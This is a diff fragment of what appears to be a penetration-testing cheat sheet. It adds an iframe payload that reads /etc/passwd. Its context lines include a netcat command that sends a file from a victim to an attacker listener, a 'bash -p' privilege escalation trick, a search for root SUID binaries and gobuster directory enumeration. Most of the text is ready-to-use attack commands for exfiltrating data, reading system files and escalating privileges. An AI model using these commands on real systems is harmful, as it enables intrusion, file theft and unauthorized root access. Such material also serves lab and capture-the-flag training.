@@ -30,7 +30,7 @@ _______________________________ /\
 [+] => TRANSFER FILE VIA NETCAT - [victime] nc -nv <ip> 1337 < <file_to_transfer> | [attacker] nc -lnvp 1337 > <file_to_transfer>
 
 -------------------------------------------------------------------------------------------------------------------------------------------+
-
+[CMD](JS)        => <iframe src=file:///etc/passwd></iframe>
 [CMD](misconfig) => bash -p 
 [CMD](BINARIES)  => find / -user root -perm -4000 -exec ls -ldb {} \;
 [CMD](ENUM)      => gobuster dir -u <url> -w=/usr/share/wordlists/dirb.../<list> -b <status_code_to_exclude>
